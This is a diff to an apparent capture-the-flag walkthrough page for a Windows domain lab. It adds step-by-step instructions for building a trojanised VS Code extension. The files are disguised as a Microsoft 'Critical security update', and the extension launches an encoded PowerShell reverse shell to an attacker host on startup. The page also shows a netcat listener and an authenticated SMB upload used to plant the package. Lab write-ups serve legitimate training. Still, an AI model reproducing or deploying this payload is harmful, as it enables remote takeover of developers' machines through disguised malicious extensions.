@@ -89,8 +89,74 @@ bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpo
 # DevDrop → READ,WRITE</code></pre>
 
           <h2>2. Exploitation</h2>
-          <h3>Malicious VSIX → Shell as <code>ryan.brooks</code></h3>
-          <p>Upload a weaponized <code>.vsix</code> to <strong>DevDrop</strong> (processed by the VS Code extension workflow):</p>
+          <h3>Craft the malicious <code>.vsix</code></h3>
+          <p><code>mark.davies</code> has <code>READ,WRITE</code> on <strong>DevDrop</strong>, a share for "approved <code>.vsix</code> packages compatible with VS Code engine 1.118.0" — so we bake a reverse shell into a VS Code extension package. A VSIX is just a ZIP with a fixed layout:</p>
+          <pre><code>├── [Content_Types].xml
+├── extension
+│   ├── extension.js
+│   └── package.json
+└── extension.vsixmanifest</code></pre>
+          <p><strong>1 — <code>[Content_Types].xml</code></strong> (registered at the archive root)</p>
+          <pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"&gt;
+  &lt;Default Extension="vsixmanifest" ContentType="text/xml"/&gt;
+  &lt;Default Extension="json" ContentType="application/json"/&gt;
+  &lt;Default Extension="js" ContentType="text/javascript"/&gt;
+  &lt;Default Extension="ps1" ContentType="application/octet-stream"/&gt;
+&lt;/Types&gt;</code></pre>
+          <p><strong>2 — <code>extension.vsixmanifest</code></strong></p>
+          <pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;PackageManifest Version="2.0.0" xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011" xmlns:d="http://schemas.microsoft.com/developer/vsx-schema-design/2011"&gt;
+  &lt;Metadata&gt;
+    &lt;Identity Id="Update.Package" Version="1.0" Publisher="Microsoft" /&gt;
+    &lt;DisplayName&gt;Update Package&lt;/DisplayName&gt;
+    &lt;Description&gt;Critical security update&lt;/Description&gt;
+    &lt;Tags&gt;update, security&lt;/Tags&gt;
+    &lt;GalleryFlags&gt;Public&lt;/GalleryFlags&gt;
+  &lt;/Metadata&gt;
+  &lt;Installation&gt;
+    &lt;InstallationTarget Id="Microsoft.VisualStudio.Code" /&gt;
+  &lt;/Installation&gt;
+  &lt;Dependencies /&gt;
+  &lt;Assets&gt;
+    &lt;Asset Type="Microsoft.VisualStudio.Code.Manifest" Path="extension/package.json" /&gt;
+    &lt;Asset Type="Microsoft.VisualStudio.Code.VSIXPackage" Path="extension/extension.js" /&gt;
+  &lt;/Assets&gt;
+&lt;/PackageManifest&gt;</code></pre>
+          <p><strong>3 — <code>extension/package.json</code></strong> (engine ≤ 1.118.0 so the box accepts it; <code>onStartupFinished</code> fires the payload on install)</p>
+          <pre><code>{
+  "name": "update-package",
+  "displayName": "Update Package",
+  "description": "Critical security update",
+  "version": "1.0.0",
+  "publisher": "Microsoft",
+  "engines": {
+    "vscode": "^1.85.0"
+  },
+  "categories": [
+    "Other"
+  ],
+  "activationEvents": [
+    "onStartupFinished"
+  ],
+  "main": "./extension.js",
+  "contributes": {
+    "commands": []
+  }
+}</code></pre>
+          <p><strong>4 — <code>extension/extension.js</code></strong> (PowerShell reverse shell, UTF-16LE → base64 for <code>powershell -enc</code>)</p>
+          <pre><code>const { exec } = require('child_process');
+function activate(context) {
+    const ps = "$c=New-Object System.Net.Sockets.TCPClient('<span class="ph">&lt;attacker-ip&gt;</span>',<span class="ph">&lt;port&gt;</span>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=([Text.Encoding]::ASCII).GetString($b,0,$i);$sb=(iex $d 2>&amp;1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbb,0,$sbb.Length);$s.Flush()};$c.Close()";
+    const encoded = Buffer.from(ps, 'utf16le').toString('base64');
+    exec(`powershell -enc ${encoded}`);
+}
+exports.activate = activate;</code></pre>
+          <p><strong>5 — package it</strong> (files must land at the ZIP root, no top-level folder):</p>
+          <pre><code>zip -r payload.vsix *</code></pre>
+
+          <h3>Upload → Shell as <code>ryan.brooks</code></h3>
+          <p>Start a listener, drop the package on <strong>DevDrop</strong>, and the VS Code extension workflow installs + activates it:</p>
           <pre><code>nc -lnvp <span class="ph">&lt;port&gt;</span>
 
 impacket-smbclient -dc-ip <span class="ph">&lt;target-ip&gt;</span> 'checkpoint.htb/mark.davies:Checkpoint2024!@<span class="ph">&lt;target-ip&gt;</span>' -debug
@@ -163,7 +229,7 @@ type C:\Users\max.palmer\Desktop\root.txt</code></pre>
     document.querySelectorAll('.note-content pre code').forEach(function (block) {
       var html = block.innerHTML;
       html = html.replace(/^(# .*)/gm, '<span class="comment">$1</span>');
-      var commands = ['wget','python3','sudo','nmap','ssh','nxc','bloodyAD','impacket-smbclient','impacket-ticketConverter','evil-winrm','smbget','vol','export','echo','base64','cp','cd','type','Get-ADUser','Import-Module','source'];
+      var commands = ['wget','python3','sudo','nmap','ssh','nxc','bloodyAD','impacket-smbclient','impacket-ticketConverter','evil-winrm','smbget','vol','export','echo','base64','cp','cd','type','Get-ADUser','Import-Module','source','zip'];
       var regex = new RegExp('\\b(' + commands.join('|') + ')\\b(?= |$)', 'gm');
       html = html.replace(regex, '<span class="cmd">$1</span>');
       block.innerHTML = html;
